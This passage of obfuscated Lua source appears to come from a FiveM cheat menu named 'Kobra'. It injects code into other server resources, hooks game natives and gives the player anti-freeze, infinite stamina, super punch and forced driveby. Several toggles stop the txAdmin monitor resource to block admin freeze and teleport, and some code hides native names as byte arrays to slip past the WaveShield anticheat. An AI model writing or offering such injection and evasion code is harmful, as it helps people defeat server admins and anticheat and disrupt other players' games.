                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]]);v12:Notify("success","Kobra","Anti-Freeze Enabled (Fallback)",1724 + 1276 );break;end end end elseif v364 then local v988=0;while true do if (v988==(0 -0)) then v12:Notify("error","Kobra","Anti-Freeze Disabled",1288 + 1712 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            antiFreezeEnabled = false
                                        ]]);break;end end else local v989=0 + 0 ;while true do if (v989==(1426 -(85 + 1341))) then v48(v365,[[
                                            antiFreezeEnabled = false
                                        ]]);v12:Notify("error","Kobra","Anti-Freeze Disabled (Fallback)",5119 -2119 );break;end end end break;end if (v363==(0 -0)) then v364=GetResourceState("WaveShield")=="started" ;v365=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v363=373 -(45 + 327) ;end end end},{type="checkbox",label="Force Third Person",checked=false,desc="This will force third person.",onSelect=function(v366) if v366 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]]);end end},{type="checkbox",label="Force Driveby",checked=false,desc="This will enable driveby if disabled.",onSelect=function(v367) if v367 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]]);end end},{type="checkbox",label="Infinite Stamina",checked=false,desc="This will enable Infinite Stamina.",onSelect=function(v368) if v368 then local v592=0 + 0 ;while true do if (v592==(0 + 0)) then v12:Notify("success","Kobra","Infinite Stamina On",8693 -5693 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]]);end break;end end else v12:Notify("error","Kobra","Infinite Stamina Off",4732 -(64 + 1668) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);end end end},{type="checkbox",label="Tiny Ped",checked=false,desc="This will turn you into a tiny ped.",onSelect=function(v369) local v370=0;local v371;while true do if (v370==(0 -0)) then v371=((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v369 then v48(v371,[[
                                        if not _G.KobraTinyPedInjected then
                                            _G.KobraTinyPedInjected = true
                                            _G.KobraTinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.KobraTinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]]);else v48(v371,[[
                                        _G.KobraTinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]]);end break;end end end},{type="checkbox",label="Super Punch",checked=false,onSelect=function(v372) local v373=0 -0 ;local v374;local v375;while true do if (v373==(495 -(415 + 79))) then if v372 then if v374 then local v990=0;while true do if (v990==(0 + 0)) then v12:Notify("success","Kobra","Super Punch Enabled",3491 -(142 + 349) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]]);break;end end else local v991=0 + 0 ;while true do if (v991==(0 -0)) then v48(v375,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]]);v12:Notify("success","Kobra","Super Punch Enabled (Fallback)",1491 + 1509 );break;end end end elseif v374 then v12:Notify("error","Kobra","Super Punch Disabled",2114 + 886 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            superPunchEnabled = false
                                        ]]);else v48(v375,[[
                                            superPunchEnabled = false
                                        ]]);v12:Notify("error","Kobra","Super Punch Disabled (Fallback)",8170 -5170 );end break;end if (v373==0) then v374=GetResourceState("WaveShield")=="started" ;v375=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v373=1865 -(1710 + 154) ;end end end},{type="divider",label="txAdmin Options"},{type="checkbox",label="txAdmin Player IDs",checked=false,desc="This will toggle txAdmin Player ids.",onSelect=function(v376) if v376 then MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]]);else MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]]);end end},{type="checkbox",label="txAdmin Noclip",checked=false,desc="This will toggle txAdmin noclip.",onSelect=function(v377) if v377 then if (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","noclip",true);else MachoInjectResource2(3,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]]);end elseif (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","none",true);else MachoInjectResource2(4 -1 ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]]);end end},{type="checkbox",label="Disable All txAdmin",checked=false,desc="This will disable txAdmin options from admins using them against you.",onSelect=function(v378) if v378 then local v593=0;while true do if (v593==0) then MachoResourceStop("monitor");print("started");break;end end else local v594=0 + 0 ;while true do if (v594==(0 + 0)) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Teleport",checked=false,desc="This will disable txAdmin Teleport.",onSelect=function(v379) if v379 then local v595=0 -0 ;while true do if ((1250 -(363 + 887))==v595) then MachoResourceStop("monitor");print("started");break;end end else print("stopped");MachoResourceStart("monitor");end end},{type="checkbox",label="Disable txAdmin Freeze",checked=false,desc="This will disable txAdmin Freeze.",onSelect=function(v380) if v380 then MachoResourceStop("monitor");print("started");else local v596=0 -0 ;while true do if ((0 + 0)==v596) then print("stopped");MachoResourceStart("monitor");break;end end end end}}},{label="Wardrobe",tabs={{icon="",type="scrollable",value=1,values={"Random"},label="Outfit",desc="Apply a preset outfit",onSelect=function(v381) if (v381=="Random") then v48("any",[[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]]);end end},{type="divider",label="Ped Options"},{type="scrollable",label="Freemode",scrollType="onEnter",value=1 + 0 ,values={"Freemode Male","Freemode Female"},onSelect=function(v382) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v382));end},{type="scrollable",label="Peds",scrollType="onEnter",value=1 -0 ,values={"Michael","Franklin","Trevor","Lamar","Jimmy","Amanda","Tracey","Ron","Wade","Dave Norton","Steve Haines","Devin Weston","Floyd","Chef","Lester","Chop","Brad","Police Officer Male","Police Officer Female","SWAT","Sheriff Male","Sheriff Female","Highway Cop","FIB Male","FIB Female","Paramedic","Firefighter","Doctor","Construction Worker","Pilot Male","Pilot Female","Business Male","Business Female","Street Dealer","Gang Male 1","Gang Male 2","Gang Female 1","Ballas 1","Ballas 2","Ballas Female","Families 1","Families 2","Vagos 1","Vagos 2","Lost MC 1","Lost MC 2","Lost MC Female","Army Soldier","Marine 1","Marine 2","Prisoner Male","Prison Guard","Cop Undercover","Security Guard","Janitor","Hobo Male","Hobo Female","Prostitute 1","Prostitute 2","Beach Male","Beach Female","Tourist Male","Tourist Female","Skater","Hipster Male","Hipster Female","Bouncer","Shopkeeper","Chef","Bartender","Waiter","Mechanic","Taxi Driver","Gardener","Farmer","Dock Worker","Trash Worker","Postal Worker","Bus Driver","Pilot","Air Hostess","Cop Traffic","Cop Detective","Agent","Reporter","News Cameraman","Hunter","Hiker Male","Hiker Female","Golfer Male","Golfer Female","Tennis Player Male","Tennis Player Female"},onSelect=function(v383) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v383));end},{type="scrollable",label="Animal Peds",scrollType="onEnter",value=1 -0 ,values={"Boar","Cat","Chicken","Chimp","Cow","Coyote","Crow","Deer","Dolphin","Fish","Hen","Humpback","Husky","Killer Whale","Mountain Lion","Pig","Pigeon","Poodle","Pug","Poodle","Rabbit","Rat","Retriever","Rhesus Monkey","Rottweiler","Seagull","Shepherd","Stingray","Tiger Shark","Hammerhead Shark","Cow","Cat2","Chickenhawk","Cormorant","Coyote2","Chimp2","Boar2","Deer2","Fish2","Husky2","Pug2","Poodle2","Retriever2","Shepherd2","Rat2","Rabbit2","Dolphin2","Killer Whale2","Mountain Lion2","Pig2","Seagull2","Stingray2","Tiger Shark2","Hammerhead Shark2"},onSelect=function(v384) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
